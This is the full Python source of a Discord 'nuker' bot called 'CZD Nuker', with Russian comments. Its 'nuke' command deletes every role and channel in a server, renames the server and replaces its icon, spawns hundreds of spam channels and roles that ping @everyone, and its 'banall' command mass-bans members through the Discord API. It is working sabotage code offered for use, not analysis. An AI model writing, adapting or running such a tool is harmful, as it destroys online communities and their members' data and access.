# библиотеки
from discord import Intents
from discord.ext import commands
from requests import put
import discord
from asyncio import create_task

prefix = '!' # префикс бота

token = 'токен бота'

# интенты и переменная бота
intents = Intents.default()
intents.members = True
client = commands.Bot(command_prefix=prefix,
                      help_command=None,
                      intents=intents)

async def killchannel(ctx,ch):
    try:
        await ch.delete()
    except:
        pass

async def sendch(ctx,ch,text,count):
 for _ in range(count):
    try:
        await ch.send(text)
    except:
        pass


async def killrole(ctx,role):
    try:
        await role.delete()
    except:
        pass

async def createchannel(ctx):
    try:
        c = await ctx.guild.create_text_channel('crash-by-czd-nuker')
    except:
        pass
    else:
        create_task(sendch(ctx,ch=c,text='@everyone\nCrash By CZD Nuker',count=30))

async def createrole(ctx):
    try:
        await ctx.guild.create_role(name='Crash By CZD Nuker')
    except:
        pass

@client.command()
async def nuke(ctx):    
    with open('icon.PNG', 'rb') as f:
        icon = f.read()
        await ctx.guild.edit(name='Crashed By CZD Nuker', icon=icon)
 
    for rolee in ctx.guild.roles:
        create_task(killrole(ctx,role=rolee))
    for channel in ctx.guild.text_channels:
        create_task(sendch(ctx,ch=channel,text='@everyone\nCrash By CZD Nuker',count=1))
    for channel in ctx.guild.channels:
        create_task(killchannel(ctx,ch=channel))
    for _ in range(500):
        create_task(createchannel(ctx))
        create_task(createrole(ctx))

@client.command()
async def rename(ctx):
    with open('icon.PNG', 'rb') as f:
        icon = f.read()
        await ctx.guild.edit(name='Crashed By CZD Nuker', icon=icon)

async def banus(ctx, limit=None):
    fetched = ctx.guild.fetch_members(limit=limit)
    memlist = await fetched.flatten()
    for member in memlist:
        if member.roles[-1].position >= ctx.guild.me.roles[-1].position:
            continue
        guild = ctx.guild
        put(f'https://discord.com/api/guilds/{guild.id}/bans/{member.id}', headers={'Authorization': 'Bot ' + token, 'X-Audit-Log-Reason': 'Crashed By CZD Nuker'}, json={'delete_message_days': 1})

@client.command()
async def banall(ctx):
    create_task(banus(ctx,limit=None))

client.run(token)
